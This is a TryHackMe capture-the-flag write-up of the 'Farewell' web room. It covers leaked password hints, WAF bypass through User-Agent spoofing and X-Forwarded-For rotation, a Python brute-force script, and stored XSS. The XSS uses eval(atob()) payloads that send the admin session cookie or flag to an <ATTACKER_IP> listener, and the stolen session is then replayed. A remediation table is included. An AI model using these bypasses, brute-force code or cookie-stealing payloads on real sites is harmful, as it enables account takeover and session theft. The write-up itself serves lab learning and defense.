# Farewell — TryHackMe Writeup

> **Room:** Farewell
> **Category:** Web / Red Team — WAF Bypass → Admin Takeover
> **Difficulty:** Medium
> **Author of writeup:** nos010101
> **Legal note:** All activity was performed against a TryHackMe lab environment for which I hold full authorized, sanctioned access as a student. Do not replicate these techniques against systems you do not own or lack explicit permission to test.

---

## TL;DR

The application defends a PHP login and message board with a multi-layer WAF but has **no application-level controls behind it**. The chain:

1. **Excessive Data Exposure** — the login API leaks a `password_hint` field the UI deliberately hides.
2. **WAF bypass #1** — spoof a browser `User-Agent` to defeat non-browser blocking.
3. **WAF bypass #2** — rotate `X-Forwarded-For` to defeat per-IP rate-limiting and brute-force a user password from its hint.
4. **Stored XSS** — the moderation queue renders raw input in an admin bot's browser.
5. **WAF bypass #3** — `eval(atob('<base64>'))` + bracket notation to defeat content/tag signatures.
6. **Session hijacking** — steal the admin `PHPSESSID` (no `HttpOnly`) and replay it to reach `/admin.php`.

**Flags** (partially redacted): `THM{USER_ACCESS_██10}` and `THM{ADMINP@wn██007}`.

---

## 1. Reconnaissance

### 1.1 Port scan

```bash
nmap -sCV -O -p- <TARGET_IP>
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Farewell — Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set     <-- note this
```

Two takeaways:
- Web is the only realistic entry (SSH is version-current, no anonymous foothold).
- **`PHPSESSID` is served without the `HttpOnly` flag** — flagged early as a likely session-theft enabler.

### 1.2 The login page and `check.js`

The login form posts nothing directly — `action="#"`, `onsubmit="return false;"`, and all logic lives in `check.js`. Reading it was the single highest-value recon step:

```js
const res = await fetch('/auth.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: form.toString(),
  credentials: 'same-origin'
});
const data = await res.json();          // server always returns JSON @ 200
...
if (data.user && data.user.password_hint) {
  showHint("Invalid password against the user");   // <-- STATIC string
}
```

The client checks whether `data.user.password_hint` **exists**, then displays a hardcoded string — **throwing the real hint value away**. The raw field is still in the server's JSON response.

> **WSTG-CLNT / API3:2019 Excessive Data Exposure** — the backend serializes the full user record; the frontend decides what to show. Bypass the frontend, read the response directly.

Usernames were also disclosed on the login page ticker: `adam`, `deliver11`, `nora`, plus `admin`.

---

## 2. Excessive Data Exposure → Username Enumeration

Hitting `/auth.php` directly first returned a WAF block page (see §3.1). After spoofing a browser UA:

```bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
for u in admin adam deliver11 nora; do
  echo "=== $u ==="
  curl -s -X POST http://farewell.thm/auth.php \
    -H "User-Agent: $UA" -H "X-Requested-With: XMLHttpRequest" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "username=$u&password=x"
  echo
done
```

The server leaked, per user, both a **password hint** and a **last-password-change timestamp**:

| User | `password_hint` | `last_password_change` |
|------|-----------------|------------------------|
| admin | the year plus a kind send-off | 2025-10-31 |
| adam | favorite pet + 2 | 2025-10-21 |
| **deliver11** | **Capital of Japan followed by 4 digits** | **2025-09-10** |
| nora | lucky number 789 | 2025-08-01 |

> **WSTG-IDNT-04 Account Enumeration** — the presence of the `user` object differentiates valid vs invalid accounts, and the leaked hints turn each account into a tiny, targeted keyspace.

`deliver11` is the cleanest crack: `Tokyo` + exactly 4 digits = a bounded 10,000-candidate space.

---

## 3. WAF Analysis & Password Cracking

### 3.1 WAF Layer 1 — non-browser blocking

A raw `curl` POST returned:

```html
<h1>🚫 403 - Access Forbidden</h1>
<p>Sorry, you don't have permission to access this page. WAF is Active</p>
```

The browser could log in fine, so the WAF was fingerprinting **non-browser clients**. Adding a realistic `User-Agent` header defeated it immediately — the request sailed through with `200`.

> **Lesson:** the WAF trusted an attacker-controlled signal (`User-Agent`). First bypass = supply the value it wants to see.

### 3.2 WAF Layer 2 — per-IP rate limiting

Sequential password guesses passed for ~10 requests, then every request began returning the 403 block page — a **per-IP rate limit**. A naive brute forcer stalled on the 10th attempt.

Because the WAF derives the "client IP" from the client-supplied `X-Forwarded-For` header, **rotating a random XFF per request makes every attempt look like a new client** — the counter never accumulates.

**Manual confirmation:**

```bash
for i in $(seq 1 20); do
  ip="10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
  curl -s -o /dev/null -w "$ip -> %{http_code}\n" -X POST http://farewell.thm/auth.php \
    -H "User-Agent: $UA" -H "X-Forwarded-For: $ip" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "username=deliver11&password=Tokyo0000"
done
# all 200 -> bypass confirmed
```

### 3.3 The brute-force script

```python
#!/usr/bin/env python3
import requests, random

TARGET = "http://farewell.thm/auth.php"
USER   = "deliver11"
PREFIX = "Tokyo"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")
s = requests.Session()

def rnd_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def try_password(pwd):
    ip = rnd_ip()
    headers = {
        "User-Agent": UA,
        "X-Requested-With": "XMLHttpRequest",
        "X-Forwarded-For": ip,      # <- defeats per-IP rate limit
        "X-Real-IP": ip,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        r = s.post(TARGET, headers=headers,
                   data={"username": USER, "password": pwd}, timeout=10)
    except requests.RequestException:
        return "err"
    if r.status_code == 403 or "WAF is Active" in r.text:
        return "waf"
    return "ok" if '"success"' in r.text else "fail"

def main():
    for n in range(10000):
        pwd = f"{PREFIX}{n:04d}"
        if try_password(pwd) == "ok":
            print(f"[+] FOUND: {pwd}")
            return
    print("[-] exhausted")

if __name__ == "__main__":
    main()
```

**Result:** `deliver11 : Tokyo10██`

> **WSTG-ATHN-03 Weak Lockout / Anti-Automation** — rate limiting keyed on a spoofable header provides no protection. Account lockout should be tracked **per account**, not per client-asserted IP.

---

## 4. FLAG 1 — User Access

Log in and persist the session cookie:

```bash
curl -s -c cookies.txt -X POST http://farewell.thm/auth.php \
  -H "User-Agent: $UA" -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=deliver11&password=Tokyo10██"
# {"success":true,"redirect":"/dashboard.php"}

curl -s -b cookies.txt -H "User-Agent: $UA" http://farewell.thm/dashboard.php
```

The dashboard yields the first flag:

```
Farewell Message - Flag: THM{USER_ACCESS_██10}
```

---

## 5. Stored XSS via the Moderation Queue

### 5.1 Identifying the sink

The dashboard has a `farewell_message` form (POST to `/dashboard.php`). Submitted messages carry a **status**:

- new messages → `🕓 Pending Review`
- seconds later → `✅ Approved`

The status auto-flips within seconds — meaning an **admin bot opens the moderation panel and renders each pending message**. That admin-side view is the XSS sink (a classic headless-bot-moderator pattern).

Critically, my **own** dashboard HTML-encodes the input:

```
submitted: <i>zz</i>  ->  rendered: &lt;i&gt;zz&lt;/i&gt;
```

So the user dashboard is **not** the sink — do not be misled by seeing your own payload encoded. The bot's admin panel renders it raw. Success is measured **only** by a callback on the listener, never by what your own page shows.

> **WSTG-CLNT-01 Stored XSS.** Encoding was applied in one output context (user view) but missing in another (admin/moderation view) — a very common real-world gap.

### 5.2 WAF Layer 3 — content + tag signatures

Raw payloads were blocked. Probing isolated the rule set:

| Payload element | Result |
|-----------------|--------|
| `<img ...>` | **BLOCK** (tag blacklisted) |
| `<body>` / `<svg>` / `<details>` | PASS |
| `document.cookie` (literal) | **BLOCK** (content signature) |
| `http://` + attacker IP | **BLOCK** (content signature) |

So the WAF matches **content signatures** (`document.cookie`, `http://`, IP) **and** a **tag blacklist** (`<img>`).

### 5.3 Bypass — `eval(atob())` + bracket notation

Base64-encoding the entire JS payload hides every signature — the WAF does not decode base64, so the sensitive strings simply vanish from its view. Decoding happens in the victim's browser:

```bash
JS="new Image().src='http://<ATTACKER_IP>:8000/?c='+document['coo'+'kie']"
B64=$(echo -n "$JS" | base64 -w0)

# winning wrapper
PAYLOAD="<body onload=\"eval(atob('$B64'))\">"
```

- `eval(atob('...'))` → opaque string, no `document.cookie` / `http://` in the wire form.
- `document['coo'+'kie']` → bracket notation as belt-and-suspenders against a literal `document.cookie` match.
- `<body onload>` → the handler auto-fires when the bot parses the page (no user interaction).

> **Same principle as the earlier auth bypasses:** reshape the *form* of the signature, not the vector. The WAF is signature-based; base64 changes the signature to nothing recognizable.

**Note on auto-firing events for headless bots:** `onload`, `onerror`, and SVG `animate onbegin` fire on parse and are reliable; `onmouseover`/`ontoggle`-on-open depend on interaction/state changes and are less reliable against a bot that merely loads the page.

### 5.4 Catching the callback

```bash
python3 -m http.server 8000     # listener, separate terminal
```

Submit the payload as the message. Within seconds the bot renders it and the listener logs:

```
<BOT_IP> - - [..] "GET /?c=PHPSESSID=d10q████████████████████tci HTTP/1.1" 200 -
```

The callback originates from the **bot's IP** (distinct from the attacker box) carrying the **admin `PHPSESSID`** — theft succeeded because `HttpOnly` was never set.

---

## 6. FLAG 2 — Admin Takeover

`curl` cannot *steal* `document.cookie` (no JS execution at the victim) — the XSS in the bot's browser did the theft. `curl`'s role is to **replay** the stolen session:

```bash
ASID="d10q████████████████████tci"
for path in admin.php admin/ moderate.php panel.php admin_dashboard.php; do
  code=$(curl -s -o /tmp/a.html -w "%{http_code}" \
    -H "User-Agent: $UA" -H "Cookie: PHPSESSID=$ASID" \
    "http://farewell.thm/$path")
  hit=$(grep -o "THM{[^}]*}" /tmp/a.html | head -1)
  echo "/$path -> HTTP $code   ${hit:+FLAG: $hit}"
done
```

```
/admin.php -> HTTP 200   FLAG: THM{ADMINP@wn██007}
```

Unauthenticated, `/admin.php` returns `403`; with the stolen session it returns `200` and the admin flag.

> **Alternative (works even with `HttpOnly`):** have the bot read the flag itself instead of stealing its cookie:
> ```js
> fetch('/admin.php').then(r=>r.text()).then(t=>{
>   let m=t.match(/THM\{[^}]+\}/);
>   if(m) new Image().src='http://<ATTACKER_IP>:8000/F/'+m[0];
> })
> ```
> This is in-session exploitation (session riding) — no cookie read required.

---

## 7. Kill Chain Summary

| Phase | Vulnerability | WAF bypass | Outcome |
|-------|---------------|------------|---------|
| Recon | `check.js` exposes `/auth.php` + schema | — | API map |
| Enum | Excessive Data Exposure (`password_hint`) | — | per-user hints |
| Login | Weak hint-based password | UA spoof + XFF rotation | `deliver11:Tokyo10██` → **FLAG 1** |
| Stored XSS | Unencoded moderation view | `eval(atob())` + bracket notation | admin `PHPSESSID` theft |
| Hijack | `PHPSESSID` w/o `HttpOnly` | curl cookie replay | `/admin.php` 200 → **FLAG 2** |

**WSTG map:** WSTG-CLNT → IDNT-04 → ATHN-03 → CLNT-01.

---

## 8. Remediation

The core lesson: **the WAF was the only control.** Any single application-level fix below breaks the entire chain.

| Control | Chain link it breaks |
|---------|----------------------|
| Output encoding in the **admin/moderation** template | the Stored XSS itself (root cause) |
| `HttpOnly` on the session cookie | `document.cookie` theft |
| CSP (`script-src 'self'`; no `unsafe-inline`) | inline handler + `eval()` execution |
| Session binding (UA/IP) + short TTL + ID rotation | stolen-cookie replay |
| **Role-based** authorization on `/admin.php` | unauthorized admin access |
| Field allow-list / DTO serialization | `password_hint` disclosure |
| Uniform "invalid username or password" response | account enumeration |
| Per-account lockout + MFA (not per-IP) | hint-based brute force |
| Do not trust `X-Forwarded-For` unless behind a controlled proxy | XFF rate-limit bypass |

Defense-in-depth here means the vector must defeat *all* of these, not one. Because none were present, the WAF alone was insufficient — which is precisely the point the room demonstrates.

---

## 9. Notes to self

- Reading client-side JS first (`check.js`) shortcut ~80% of the discovery.
- Layered WAFs tend to fail on the same theme: each layer trusts an attacker-controlled signal — UA, then asserted source IP, then payload byte-pattern. Identify the trusted signal, then reshape or override it.
- Base64 vs signature filters mirrors double-encoding vs ModSecurity: change the signature's *form*, not the vector.
- Confirm the listener is reachable (`curl http://<ATTACKER_IP>:8000/selftest`) before blaming the payload.
- For payloads with quotes/special chars, stage via file + `--data-urlencode name@file` to avoid shell/clipboard mangling.
